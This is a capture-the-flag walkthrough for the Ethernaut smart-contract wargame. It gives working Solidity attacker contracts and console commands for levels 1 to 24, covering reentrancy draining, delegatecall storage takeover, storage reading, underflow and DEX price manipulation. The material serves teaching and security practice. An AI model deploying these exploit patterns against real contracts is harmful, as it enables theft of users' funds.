# Ethernaut Solutions

I decided to put together my own Ethernaut solutions since many out there were either out of date or simply wrong. As of Solidity 0.8.17, these solutions should all work.

For most of the nontrivial stuff, I'm using eth-brownie to interact with the chain, deploy contracts, etc. You're free to use what you're comfortable with, but my examples will be with brownie.

If you haven't used brownie before and aren't familiar with any of its alternatives, you can get a good introduction via BowTiedDevil's substack here: https://degencode.substack.com/p/start-here 

The relevant introductory articles are outside the paywall.

For all brownie console code, assume I've already loaded my account as `player` and the instance address as `instance`.

## 1. Hello Ethernaut

This level is a tutorial to help you get used to using the browser console. You shouldn't have any trouble passing it on your own - and if you do, you should probably work to get comfortable here before attempting any further challenges.

If you really need a hint, you can use `contract.abi` to get a list of available functions for the level's contract. 

## 2. Fallback

To beat this level, we need to claim ownership of the contract. If you take a look, you can see that the `receive` function will set `owner` to `msg.sender` if you can pass its require statement. 

We need to get our entry in `contributions` to be greater than 0 and then send a transaction to the instance contract with `msg.value` greater than zero.

In the browser console:

    await contract.contribute({value: 1})
    await contract.send(1)

    //check that you're now the owner - should return your address
    await contract.owner()

Assuming you're now the owner of the instance, you can submit the level and move on!


## 3. Fallout

This level isn't particularly relevant anymore - the constructor is now actually called 'constructor' rather than being a regular function with the same name as the contract, so it's ~impossible to make an error like this without using an outdated compiler version.

Since the `Fal1out` function has a typo (the second L is a 1), anyone can call it at any time and become the owner of the contract.

In the browser console:
    
    await contract.Fal1out()

That's it, you can submit this level and move on to the next.

## 4. Coin Flip

This level is an example of gameable pseudo-randomness. Since the contract is public, you can see how it is calculating the result of the coin flip. All code in a chain of calls within a single transaction is executed simultaneously, so you can make a call using the same calculation with the same `block.number`.

    // SPDX-License-Identifier: MIT
    
    pragma solidity ^0.8.0;
    
    interface ICoinFlip {
      function flip(bool _guess) external returns (bool);
      function FACTOR() external view returns (uint256);
    }
    
    contract CoinFlipAttacker{
      ICoinFlip public immutable instance;
      uint256 public immutable FACTOR;
    
      constructor(address _instance) {
        instance = ICoinFlip(_instance);
        FACTOR = instance.FACTOR();
      }
    
      function cheat() public{
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;
    
        instance.flip(side);
      }
    }

Deploy the contract with your instance as the constructor parameter, and then call `cheat` 10 times in a row to accumulate the required win streak. Note that you can only call it once per a block due to the `lastHash == blockValue` check, so you may see some reverts if you try again before the next block.

## 5. Telephone 

This level exists to demonstrate the difference between `tx.origin` and `msg.sender`. At any time within a chain of calls, `tx.origin` will be the account that originated the first call, while `msg.sender` will be the caller of the current function being executed.

The key here is `if(tx.origin != msg.sender)`.

To ensure that our `tx.origin` and `msg.sender` are different, we can make use of a middleman contract that will call `changeOwner` for us.

    // SPDX-License-Identifier: MIT
    
    pragma solidity ^0.8.0;
    
    interface ITelephone {
      function changeOwner(address _owner) external;
    }
    
    contract TelephoneAttacker{
      ITelephone public immutable telephone;
    
      constructor(address _instance) {
        telephone = ITelephone(_instance);
      }
      
      function attack() public{
        telephone.changeOwner(msg.sender);
      }
    }
    
When you call `attack`, your wallet address will be `msg.sender`, and it will also be  `tx.origin` for any call that is made as a result of your call. When your TelephoneAttacker contract calls `changeOwner` on the Telephone contract, your address will still be `tx.origin`, but now the TelephoneAttacker contract's address will be `msg.sender`. Since you and the TelephoneAttacker contract don't share the same address, we pass the `tx.origin != msg.sender` check and claim ownership of the Telephone contract.

## 6. Token

This level is an example of an arithmetic over/underflow. These aren't a huge issue anymore since solidity compiler versions 0.8.0 and up automatically check for overflows and throw an error if one occurs. 

To beat this level, you want to call `transfer` with a `_value` greater than your balance within the balances mapping. It will still pass the `balances[msg.sender - _value >= 0` check because when your balance goes below zero, it wraps around to the maximum uint256 value. 

So call `transfer` once with a `_value` of 21 (or anything greater than your initial balance of 20):

    await contract.transfer(player,21);

And then call `transfer` again to take your new, much larger balance out:

    await contract.transfer(player, (await contract.balanceOf(player));

Now you can submit the level!
    
## 7. Delegation

This level serves as an introduction to `delegatecall` which is very important to understand as it serves as the basis for many contract upgrade patterns.

`delegatecall` executes the target contract's function using the calling contract's state as if the function belonged to the calling contract. 

For example, in this level, we're trying to call `pwn` to change `owner` to the `msg.sender`. We need to trigger `fallback` with a call whose `msg.data` is a call to `pwn`.

Using the brownie console to encode and call:

    payload = web3.keccak(text='pwn()')[:4].hex()
    player.transfer(to=instance,data=payload)
    
This triggers the `fallback` function which makes a `delegatecall` to the delegate contract's `pwn` function - but calls it using the Delegation contract's state - including its `msg.sender` (so your address will still be `msg.sender` and not just `tx.origin`). It'll then execute the code of `pwn` which changes `owner` to `msg.sender` which is your address. You're now the owner! 

Note that the names of the variables are irrelevant for `delegatecall` - so it's actually changing the storage slot of `owner`, which happens to be the same in both contracts here. The fact that they're both named 'owner' is irrelevant.

## 8. Force

For this level, we'll be taking a look at `selfdestruct`. Since there's no receive or payable fallback function here, you can't send ether to this contract, right? WRONG! 

When a contract executes a `selfdestruct`, it deletes its own bytecode and sends its ether balance to the specified destination address, which has to accept it even if it has no receive or fallback function.

We want to write and deploy our own contract:

    // SPDX-License-Identifier: MIT
    
    pragma solidity ^0.8.0;
    
    contract ForceAttacker{
      function kill(address payable instance) public payable{
        selfdestruct(instance);
      }
    }

Call your `kill` function with a `msg.value` greater than 0 to destroy this contract and send ether to the instance contract. Then submit the level.

## 9. Vault

To unlock the vault, we need the password. But the password is private, so we can't call contract.password() to get it. However, just because a variable is not publicly callable doesn't mean it isn't available. To get the password, we need to get into the contract's storage directly.

Storage in solidity is laid out in 32-byte slots. The vault contract's first storage variable is a bool type, which takes up 1 byte in storage. Multiple variables can fit in one slot as long as they add up to less than 32 bytes - but the next variable `password` is bytes32, i.e. it takes up 32 bytes, so it can't fit in slot 1 and is stored on its own in the next slot.

Using brownie console again, we can directly access storage:

    password = web3.eth.getStorageAt(instance, 1) #slot 1 is the second slot since it's indexed from 0
    
    #encode and call unlock
    import eth_abi
    selector = web3.keccak(text='unlock(bytes32)')[:4].hex()
    args = eth_abi.encode_single('(bytes32)',[password]).hex()
    payload = selector + args
    player.transfer(to=instance,data=payload)
    
You can check that you've been successful by getting storage at slot 0:

    web3.eth.getStorageAt(instance, 0)
    
If it returns a hex string of all zeros, you know that `locked` is now false, and you can successfully submit the level!

## 10. King

Our goal for this level is to become king - and defend that role against any upstarts!

Claiming the king role is simple - send an ether amount greater than `prize` directly to the contract so the receive function can trigger, send the current king the prize and make you king. But if you try to submit the level here, the owner will always be able to reclaim the king role from you. We need to find a way to prevent the receive function from executing after we claim our kingship.

To do this, we want to claim the king role via a contract of our own creation, and we want any triggers of our contract's receive function to revert. Easy! 

    // SPDX-License-Identifier: MIT
    
    pragma solidity ^0.8.0;
    
    interface IKing {
      function prize() external view returns (uint);
    }
    
    contract KingSlayer{
    
      function kill(address instance) external payable{
        require(msg.value >= IKing(instance).prize(), 'msg.value should be higher than prize.');
        (bool success,) = instance.call{value: msg.value}("");
        require(success);
      }
    
      receive() external payable{
        revert('Nice try, pal!');
      }
    }

Notice that this contract's receive function will ALWAYS revert - which means that any of the King contract's receive function transfers to this address will revert, and nobody can claim kingship after us.

In the brownie console:

    attacker = KingSlayer.deploy({'from': player})
    prize = interface.IKing(instance).prize()
    attacker.kill(instance,{'from': player, 'value': prize})
    
And that's it, now the level can be submitted!

## 11. Reentrance

Reentrancy is a classic solidity exploit - the 2016 DAO hack which prompted the ETH-ETC hard fork was a reentrant attack.

The idea for this level is to call withdraw in a way that will prompt additional calls to withdraw before the balances can be updated to reflect it. Since the contract will be sending ether to us, we know that we can make use of a receive function - and that's where we'll execute our attack.

    // SPDX-License-Identifier: MIT
    
    pragma solidity ^0.8.0;
    
    interface IReentrance {
      function donate(address _to) external payable;
      function balanceOf(address _who) external view returns (uint balance);
      function withdraw(uint _amount) external;
    }
    
    contract ReentranceAttacker {
    
      IReentrance public instance;
      
      function kill(address payable _instance) public payable{
        require(msg.value == .001 ether, 'msg.value should be .001 ether');
        instance = IReentrance(_instance);

        //donate our .001 ETH to the contract so we have a balance to withdraw
        instance.donate{value: .001 ether}(address(this));

        //call withdraw with amount as our balance in the contract
        instance.withdraw(instance.balanceOf(address(this)));

        //send the stolen eth back to our personal wallet
        payable(msg.sender).transfer(address(this).balance);
      }
    
      receive() external payable{
        instance.withdraw(instance.balanceOf(address(this)));
      }
    }
    
The flow here is:

1. Player calls `kill` with msg.value of .001 ether
2. `kill` calls `donate` on the instance, .001 ether is added to `balances` for our contract
3. `kill` calls `withdraw` with an additional call to `balances` as its `_amount` parameter so we're withdrawing exactly our balance
4. during `withdraw`, ether is sent back to our contract, triggering our `receive` function
5. `receive` makes an additional call to `withdraw` before `balances` is updated, which then sends additional ether, triggering `receive` again and repeating until the contract is drained
6. `kill` sends the stolen ether back to `msg.sender` - our wallet.

Only after the contract has run out of ether does the withdraw function advance to its `balances` update instruction - which is why we're able withdraw more than we deposited.

In the brownie console:

    attacker = ReentranceAttacker.deploy({'from': player})
    attacker.kill(instance,{'from': player, 'value': .001*10**18}) #.001*10**18 is .001 ether converted to wei

That's it, the contract is drained and you can submit the level!

## 12. Elevator

Our goal for this level is to get `top` to equal `true`. We can see that the value to `top` is assigned the result of `building.isLastFloor(floor)` within the `goTo` function. This is our attack vector.

`goTo` uses the `Building` interface to interact with msg.sender. `if(! building.isLastFloor(_floor))` is a check that ensures `isLastFloor` returns `false`. But we need it to return true later on when we assign its return value to `top`. How do we get it to return different values for the same input?

The `building` interface only specifies that the given contract has a function called `isLastFloor` that takes a uint parameter and returns a boolean value. It does not specify what the inner workings of that function should be. So we can build a contract that does anything as long as it fits the interface's specification:

    // SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    interface Building {
      function isLastFloor(uint) external returns (bool);
    }

    interface IElevator {
        function goTo(uint _floor) external;
    }

    contract ElevatorAttacker is Building{
        
        bool public counter = true;

        function isLastFloor(uint) external returns (bool) {
                counter = !counter;
                return counter;
        }

        function kill(address _instance) external {
            IElevator(_instance).goTo(99); // the uint input here is irrelevant - can be anything
        }
    }

In this contract, `isLastFloor` is set up to return whichever boolean value it did not return last time it was called. 

We can call the Elevator contract's `goTo` function from this contract, and it will make its first call to our `isLastFloor` which sets `counter` to and returns `false` (the opposite of the initially set `true` value). Then the second call will return `true`, flipping `top` to `true` and completing our task for this level. 

In the brownie console:

    attacker = ElevatorAttacker.deploy({'from': player})
    attacker.kill(instance,{'from': player})

Submit the instance and go to the next level!

## 13. Privacy

This level is very similar to Vault in that we're accessing storage directly to get supposedly hidden information. This time we aren't looking for an item stored in the first slot, so we need to understand how solidity lays out storage slots.

Remember that (with some exceptions) storage variables are stored in sequential 32 byte slots indexed from 0. This contract's storage is laid out as such:

1. boolean `locked` taking up 1 byte in slot 0
2. uint256 `ID` taking up all of slot 1 (uint256 = 32 bytes, can't fit in slot 0 with `locked`)
3. uint8 `flattening`, uint8 `denomination`, and uint16 `awkwardness` all crammed into slot 2, taking up (8+8+16)/8 = 4 bytes.
4. bytes32 `data` begins in slot 3 with `data[0]`. There are 3 items in `data`, each being 32 bytes in size and taking up a full slot.
5. `data[1]` takes up all of slot 4.
6. `data[2]` takes up all of slot 5.

The unlock function has a check that the input is `data[2]` converted to bytes16. So we need to get `data[2]` from storage and truncate it to bytes16

I'm deploying the following contract:

    // SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    interface IPrivacy {
        function unlock(bytes16 _key) external;
    }

    contract PrivacyInvader{
        function kill(address instance, bytes32 key) external {
            bytes16 casted = bytes16(key);
            IPrivacy(instance).unlock(casted);
        }
    }

Note the `kill` function's casting of the bytes32 input to bytes16 via `bytes16(key)`. Then it calls `unlock` with the new bytes16 key.

In the brownie console:

    invader = PrivacyInvader.deploy({'from': player})
    key = web3.eth.getStorageAt(instance, 5)
    invader.kill(instance, key, {'from': player})

Submit the level and move on!

## 14. Gatekeeper One

This is one of the harder levels. We need to find an input that will pass each of 3 gates. 

`gateOne` should be easy by now - we're going to be using a contract to make the call so `msg.sender != tx.origin` evaluates `true`.

`gateTwo` is a little more tricky. We need to specify gas for our call to `enter` such that there is a multiple of 8191 gas left by the time our transaction gets to the second gate. I guess you could calculate the answer for this manually if you wanted, but we have computers, so we're going to make them do the work for us. Let's get the third gate covered and then circle back to this one.

`gateThree` requires knowledge of how different sized uint variables are modfied when casting them down in size. When casting a uint down, you convert it to its hex representation (0xXXXXXXXXX) and remove digits from the left until you get the desired size. For example, a uint32 with `0xABCD1234` hex representation would become `0x1234` when cast down to uint16.

For the first check in `gateThree`, we need to make sure our key is the same value in both uint32 and uint16. This means that our key's last 4 bytes should be `0000XXXX` since  `0xXXXX` and `0x0000XXXX` are the same value.
>Note that the initial uint64 conversions are necessary because explicit conversions from fixed size bytes to uint must remain the same size. A 64 bit uint is 8 bytes. 

For the second check, we need the uint32 cast of our key to NOT equal the uint64 cast. That's easy - just make any of the leading 4 bytes nonzero. For example, `0x10000000XXXXXXXX`. Combine with the first check in `gateThree` and you get `0x100000000000XXXX`.

For the third check, we need the uint32 cast of our key to equal the uint16 cast of our wallet address (uint160 is the conversion of our 20 byte wallet address to uint). My wallet's last 2 bytes are 8e11, so my key will be `0x1000000000008e11`.

The contract I'm using:

    // SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    interface IGatekeeperOne {
        function enter(bytes8 _gateKey) external returns (bool);
    }

    contract GK1Attacker {

        IGatekeeperOne public immutable instance;
        bool public success;

        constructor(address _instance) {
            instance = IGatekeeperOne(_instance);
        }

        function execute(bytes8 key, uint256 gasToUse) external {
            instance.enter{gas: gasToUse}(key);          
        }

        function check(bytes8 _gateKey) external {
            require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
            require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
            require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
            success = true;
        }
    }

The `check` function is included so you can be sure you're going to pass `gateThree` before you waste time brute forcing the gas.

To brute force the gas check for `gateTwo`, we're just going to iterate through all possible options starting at 800,000 and ending at 800,000 + 8191. 

In the brownie console:

    attacker = GK1Attacker.deploy(instance,{'from': player})
    myKey = '0x1000000000008e11' #replace last 4 digits with last 4 of your wallet address
    myKey = bytes.fromhex(myKey[2:]) #convert string to bytes (slice off the 0x)

    gasGuess = 800000
    for i in range(0,8192):
        print(i)
        try:
            attacker.execute(myKey, gasGuess + i,{'from': player})
            break
        except:
            continue

Reverted transactions consume no gas, so don't worry about trying several thousand `gasGuess` values. This can take a while, so you may want to move on to the next level while you wait.

Usually the correct gas amount for me is in the 800,000 + 2500 - 3500 range. Once your loop breaks and you have a successful transaction, you can submit the level and move on to the next!

## 15. Gatekeeper Two

`gateOne` is the same as last time - we're going to attack with a contract of our own.

`gateTwo` requires that our `extcodesize` is zero - that is, the length of our contract's bytecode is zero. 

From the Ethereum Yellow Paper, section 7.1, footnote 5:

> During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while
CODESIZE should return the length of the initialization 

This means that while the constructor is executing, EXTCODESIZE will return zero - so we need to execute our attack within our attacker contract's constructor to pass `gateTwo`.

For `gateThree` we need `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)` to evaluate `true`. `msg.sender` here is going to be your attacker contract's address. Since your key is dependent on what that address is, we'll try to calculate the key within the contract itself.

`^` is the bitwise XOR operator, which takes the binary representation of each side and for each bit returns a 0 if the respective bits are the same or a 1 if they're different. For example, 01101100 ^ 11110000 returns 10010011. 

But for our purposes, it's more important to know that for numbers `x`,`y`, and `z`: 

> if `x ^ y == z`, then `x ^ z == y`

This means we can do simple algebra to arrive at the following formula for our key:

    uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max) == uint64(_gateKey)

So in our constructor, we can have this :

    bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);

Our attacker contract:

    //SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    interface IGatekeeperTwo {
        function enter(bytes8 _gateKey) external returns (bool);
        function entrant() external view returns (address);
    }

    contract GK2Attacker {
        constructor (address _instance) {
            IGatekeeperTwo instance = IGatekeeperTwo(_instance);
            bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
            instance.enter(myKey);        
        }
    }

In the brownie console:

    attacker = GK2Attacker.deploy(instance, {'from': player})

    #check for success (should return your address):
    interface.IGatekeeperTwo(instance).entrant()

Submit the level and move on to the next!

## 16. Naught Coin

This is a very easy level that showcases how important it is to understand how inherited functions work. 

NaughtCoin is an ERC20 token. Since it inherits ERC20, anyone can call any of the public ERC20 functions on the NaughtCoin contract.

The `locktokens` modifier only affects the `transfer` function, but that isn't the only way to transfer ERC20 tokens. We also have access to `transferFrom` even if it isn't explicitly included in the NaughtCoin contract.
    
In the browser console:

    await contract.transferFrom(player, contract.address, await contract.balanceOf(player))

It's that simple - go ahead and submit the level.

## 17. Preservation

To beat this level, we need to claim ownership of the Preservation contract. 

Right away, we can see there are delegatecalls in the `setFirstTime` and `setSecondTime` functions, and the calls are being made to a function that alters the variable in the first storage slot.

I'll be using this contract to assist in my takeover:

    //SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    interface IPreservation {
        function setFirstTime(uint _timestamp) external;
    }

    contract PreservationAttacker {
        
        address public placeholder1;
        address public placeholder2;
        address public gotcha;

        function setTime(uint256) public {
            gotcha = tx.origin;
        }

        function attack(address instance) external {
            uint key = uint(uint160(address(this)));
            IPreservation(instance).setFirstTime(key);
        }
    }

The layout of storage variables here is important, but we'll get to that. 

First, I'll deploy the contract and call `attack`:

    attacker = PreservationAttacker.deploy({'from': player})
    attacker.attack(instance, {'from': player})

Now we can check the `timeZone1Library` address in the browser console:

    await contract.timeZone1Library()

It should be the same as your attacker contract's address! Our attack function calls `setFirstTimeKey` with its own contract address converted to a uint as the input. The delegatecall causes this to actually set `timeZone1Library` to our contract address instead of updating `storedTime`.

Now `setFirstTime` will be making delegatecalls to our contract. Uh oh! We need to have a function whose signature matches `setTime(uint256)` but we can have anything we want within the function.

Remember that we're trying to set `owner` to our own address. This is where our storage layout comes into play. We can simply copy the Preservation contract's layout and then have our `setTime` function set the variable in the `owner` slot to our address.

This time we call Preservation directly in the browser console:

    await contract.setFirstTime(100) //the input doesn't matter since our function doesn't actually use it

    //check for success (should return your wallet address)
    await contract.owner()

Submit the level and move on.

## 18. Recovery

This is a pretty simple level. We need to call `destroy` on the SimpleToken contract, but we don't have its address. 

We do, however, have the transaction that created it. In the browser console, after you request a new instance, it should say 'Sent Transaction' with a link to the block explorer for the network you're using. Open that link.

Under the 'To:' section, it should have two transfers of .001 ETH: one to the level address and another from the level address to some other address. This other address is the one we want. You can even click on it to see that it has the .001 ETH balance we need to rescue. We just need to make our call to `destroy`.

In the brownie console:

    #load in the SimpleToken address from the explorer (I'll show mine below)
    simpleTokenAddress = '0xD2ca5aB4801Bad097018112126a33065777C8c20'

    import eth_abi
    sig = web3.keccak(text='destroy(address)')[:4].hex()
    params = eth_abi.encode_single('(address)',[player.address]).hex()
    payload = sig + params
    player.transfer(to=simpleTokenAddress, data=payload)

If you still have the SimpleToken address loaded in your explorer, you can see that it now has an ether balance of 0. Submit the level and move on!

## 19. Magic Number

There are actually two ways you can solve this level. You can deploy a contract that uses inline assembly within the constructor to store the runtime bytecode, or you can manually construct both the initialization and runtime bytecode to be deployed directly to the chain. I'll show both. 

In both cases, we need to build the runtime bytecode, so we'll start there. Refer to https://www.evm.codes/?fork=grayGlacier as you follow along.

We need to use 10 or less opcodes to return a value of 42, which is 0x2a in hex. To return a value, we first need to store it in memory, so we'll be using `MSTORE` which has an opcode of 52 and takes 2 arguments, the value to be stored and the memory location to store it at, both of which must be added to the stack using `PUSH1`. `PUSH1` is the command for pushing a 1 byte item onto the stack.

Then we need to build our return bytecode. Return also takes 2 arguments, the size of the data being returned and its location in memory.

Our runtime bytecode can therefore be built as follows:

    602a    // PUSH1 0x2a (42 - the item we want to return)
    6000    // PUSH1 0x00 (we'll use 0 for our memory location)
    52      // MSTORE
    6020    // PUSH1 0x20 (32 bytes)
    6000    // PUSH1 0x00 (memory slot again)
    f3      // RETURN

So we've got 602a60005260206000f3 - which is exactly 10 bytes long!

Now we need to set up our initialization bytecode. We'll start off with `CODECOPY` which takes 3 arguments off the stack: the offset in memory where we want to copy to, the offset within the code we want to copy, and the size of the code we want to copy. 

Our initialization bytecode:

    600a    // PUSH1 0x0a (10 bytes - the size of our runtime bytecode)
    600c    // PUSH1 0x0c (initialization code will be 12 bytes, so runtime will start at position 12)
    6000    // PUSH1 0x00 (start at position 0)
    39      // CODECOPY
    600a    // PUSH1 0x0a (size of runtime bytecode again)
    6000    // PUSH1 0x00 (memory offset)
    f3      // RETURN

Altogether it's 600a600c600039600a6000f3

Combine initialization with runtime (and prepend an '0x') and you get 0x600a600c600039600a6000f3602a60005260206000f3.

In the brownie console:

    bytecode = '0x600a600c600039600a6000f3602a60005260206000f3'
    
    # deploy the bytecode via a transfer with only a data parameter
    deployment = player.transfer(data=bytecode)

    interface.IMagicNum(instance).setSolver(deployment.contract_address, {'from': player})

Then submit the level, and it should accept it.

You can also deploy the following contract, which will handle the initialization bytecode for you:

    // SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    contract MagicNumberAttacker{
        constructor() {
            assembly{
                // Store bytecode in memory at position 0
                mstore(0x00, 0x602a60005260206000f3)
                // return 10 bytes starting from mem position 0x16 (32 bytes total, 
                // skip the first 22, leaving the final 10 bytes - our runtime bytecode)
                return(0x16, 0x0a)
            }
        }
    }

Deploy this and set its address in `setSolver` and it should pass. Note that after deployment, you can call `attacker.bytecode` and it'll return just our runtime bytecode: `'602a60005260206000f3'`

EVM opcodes can be tricky. If you need some extra practice, I recommend https://github.com/fvictorio/evm-puzzles. 

## 20. Alien Codex

This level showcases the dangers of arithmetic over/underflow and unbounded arrays. Notice right off the bat that there's a method to reduce the length of the codex array, which already has a length of 0. You can see where I'm going with this - we're going to underflow the `codex` array to give ourselves access to the entire contract's storage.

We can use our `getStorageAt` method to see that the owner variable is stored in slot 0 of the contract's storage - it should be the level's address -  but what is the equivalent array index?

We first need to figure out which storage slot our array is at. Let's call `make_contact` and add something to the array via `record` so there's data in storage we can see.

In the brownie console with an AlienCodex interface loaded at the instance address:

    alienCodex.make_contact({'from': player})
    alienCodex.record(100, {'from': player})

Then we can `getStorageAt` again. Notice that calling it on slot 0 will have an extra 1 to the left of the owner address - since an address is only 20 bytes, there's room for the 1 byte boolean `contact` in the same slot. 

We can also see that there's now a 1 in slot 1. Calling `record` again with any value will make it a 2 since the length of the `codex` array is stored in slot 1. The actual values will be stored at the storage slot matching the keccak256 hash of this slot, so it'll be keccak256(1) here.

In the brownie console:

    slot = web3.toInt(hexstr=web3.solidityKeccak(['uint256'],[1]).hex())


This may seem complicated, but it's just the keccak256 hash of 1. Note that some keccak methods use different forms of encoding before computing the hash, so if you don't use the above method, make sure your slot is `80084422859880547211683076133703299733277748156566366325829078699459944778998`. You can check by getting storage at this slot and seeing that it's the hex representation of whatever you used as input when calling `record`.

Now we can underflow the `codex` array by calling `retract` until the length wraps from zero to the max uint256 value. If you've got 2 items in `codex`, call `retract` three times so that the value stored in storage slot 1 is now `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`, which is the hex representation of 2**256-1, the max uint256 value and the highest possible index for storage slots. The `codex` array now has access to the entirety of the contract's storage.

Now we need to figure out which array index is equivalent to the contact's 0 storage slot. When overflowing, slot 0 is equivalent to 2**256, so we can use our above slot to determine the array index.

    slotZero =  2**256 - slot.
    
    #now check that index in codex
    alienCodex.codex(slotZero)
    #should return the same as web3.eth.getStorageAt(instance,0)

Now that we have our array location we can overwrite it with `revise`, replacing the current owner with our address. 

    oldValue = alienCodex.codex(slotZero)
    newValue = '0x' + oldValue.hex()[:24] + player.address[2:]
    alienCodex.revise(slotZero, newValue)

Check that your address is now in slot zero using `getStorageAt`. And then submit the level!

## 21. Denial

This level is yet another example of the dangers of low-level external calls. 

Anyone can `setWithdrawalPartner` to add a `partner` that will receive some ether via `call` in the `withdraw` function. We know that any contract can implement a `receive` function to execute arbitrary instructions upon receiving ether, so we're going to implement a malicious receive function.

We need to brick the withdraw function so that the owner can't withdraw funds. The success of the `call` to `partner` is unchecked, so a simple `revert` won't cut it. We can, however, use up all of the transaction's available gas so it can't execute any further instructions.

Our contract:

    //SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    interface IDenial {
        function withdraw() external;
        function setWithdrawPartner(address _partner) external;
        function contractBalance() external view returns (uint);
    }

    contract DenialAttacker {
        
        bool public constant YOU_ARE_A_SUCKER = true;
        bool public gasWaster;

        receive() external payable {
            while(YOU_ARE_A_SUCKER){
                gasWaster = !gasWaster;
            }
        }
    }

Notice the infinite loop with state changes in our receive function - the perfect gas guzzler!

In the brownie console:

    attacker = DenialAttacker.deploy({'from': player})
    denial = interface.IDenial(instance)
    denial.setWithdrawPartner(attacker.address,{'from': player})

That's actually it, no need to even call `withdraw`. Submit the level and move on.

## 22. Shop

This is another level where the contract is making a function call to msg.sender without any restrictions other than the name of the function. 

We can set up our malicious contract with a `price` function containing any instructions we want it to. Our goal is to get the item for cheaper than listed, which specifically means setting `isSold` to `true` and `price` to something less than the initial 100.

The `buy` function is going to query our contract's `price` function twice - once to check that it's above the current price and a second time to set the new price. This should seem familiar - it's similar to what we did in the Elevator level.

Our contract:

    //SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    interface Buyer {
        function price() external view returns (uint);
    }

    interface IShop {
        function buy() external;
        function isSold() external view returns (bool);
    }

    contract ShopLifter is Buyer {

        function attack(address instance) external {
            IShop(instance).buy();
        }

        function price() external view returns (uint) {
            if(!IShop(msg.sender).isSold()){
                return 100;
            }
            else {
                return 0;
            }
        }
    }

You can see that when `isSold` is `false`, it gives a price of 100, but after `isSold` is toggled to `true`, it returns a price of 0.

Deploy the ShopLifter contract, call `attack`, and you should be good to go! Submit the level and move on.

## 23. Dex

This level is very simple - you can finish it in the browser console. You're going to learn why it's better to use trusted oracles to get prices and other information - they're harder to manipulate!

Let's get set up:

    let token1 = await contract.token1()
    let token2 = await contract.token2()
    await contract.approve(instance,10000000000000) #approve the instance to spend an arbitrary high number of tokens

See how a swap of all of token1 into token2 affects the price:

    await contract.getSwapPrice(token2, token1, 10) //should return 10
    await contract.swap(token1, token2, 10)
    await contract.getSwapPrice(token2, token1, 10) //should return 12

This means that instead of 10:10, price is now 10:12. And since it's calculated as a flat rate before the swap occurs, you can now swap your 20 token2 coins into 24 token1 coins. You may see where this is going.

    //swap all of token2 back to token1
    await contract.swap(token2, token1, await contract.balanceOf(token2, player))
    
    //swap all of token1 back to token2
    await contract.swap(token1, token2, await contract.balanceOf(token1, player))
    
    //repeat 
    await contract.swap(token2, token1, await contract.balanceOf(token2, player))
    await contract.swap(token1, token2, await contract.balanceOf(token1, player))
    await contract.swap(token2, token1, await contract.balanceOf(token2, player))
    
    //At this point, you'll get an error if you try again since there aren't enough tokens left in the contract for your input. 
    //Get contract's balance of token we're swapping into (token1)
    await contract.balanceOf(token1, instance)

    //Get contract's balance of token2
    await contract.balanceOf(token2, instance)

    //The token1:token2 ratio is 110:45, so we should get all of token1 out if we put 45 of token2 in
    await contract.swap(token2, token1, 45)

    //check your work - should return 0
    await contract.balanceOf(token1, instance)

Now you can submit the level.

## 24. Dex Two
    
This level is very similar to the previous one, but now there's nothing stopping outside tokens from being added as liquidity. Let's create our own token and see what sort of havoc we can wreak.

My contract:

    //SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    import "../@openzeppelin/contracts/token/ERC20/ERC20.sol";

    interface IDexTwo {
        function token1() external view returns (address);
        function token2() external view returns (address);
        function swap(address from, address to, uint amount) external;
        function getSwapPrice(address from, address to, uint amount) external view returns(uint);
        function approve(address spender, uint amount) external;
        function balanceOf(address token, address account) external view returns (uint);
    }

    contract FakeToken is ERC20 {
        constructor(uint256 amount) ERC20('fakeToken','FAKE') {
            _mint(msg.sender, amount);
        }
    }

    contract DexTwoAttacker {

        address public immutable instance;
        IDexTwo public immutable dex;
        FakeToken public immutable fakeToken;

        constructor(address _instance) {
            instance = _instance;
            dex = IDexTwo(_instance);
            fakeToken = new FakeToken(1_000_000);
        }

        function attack() external {
            //approve dex instaance for token spend
            fakeToken.approve(instance,1000000000000);

            //supply liquidity (same as calling add_liquidity)
            fakeToken.transfer(instance,1);

            //swap 1 fake token for all of token1
            dex.swap(address(fakeToken),dex.token1(),1); 
            //swap 2 fake tokens for all of token 2
            dex.swap(address(fakeToken),dex.token2(),fakeToken.balanceOf(instance));
            
            //transfer the stolen tokens to my wallet
            IERC20(dex.token1()).transfer(msg.sender,IERC20(dex.token1()).balanceOf(address(this)));
            IERC20(dex.token2()).transfer(msg.sender,IERC20(dex.token2()).balanceOf(address(this)));
        }
    }

We've got our very basic ERC20 token, "fakeToken" that is deployed by the DexTwoAttacker contract's constructor and mints its entire supply to the attacker contract.

The `attack` function supplies 1 fakeToken of liquidity to the dex. The `getSwapAmount` function will now determine that the entirety of its reserves for either `token1` or `token2` are worth the same as that single `fakeToken`. So we'll swap 1 additional `fakeToken` into the dex and receive all of `token1`. 

Now there are 2 of our tokens in the contract, so `getSwapAmount` will determine that those 2 tokens are worth the same as the entirety of the remaining token reserves. We swap 2 of our tokens in for the entirety of `token2` reserves.

Deploy your attacker, call `attack`, and you're good to submit the level and move on.

## 25. Puzzle Wallet

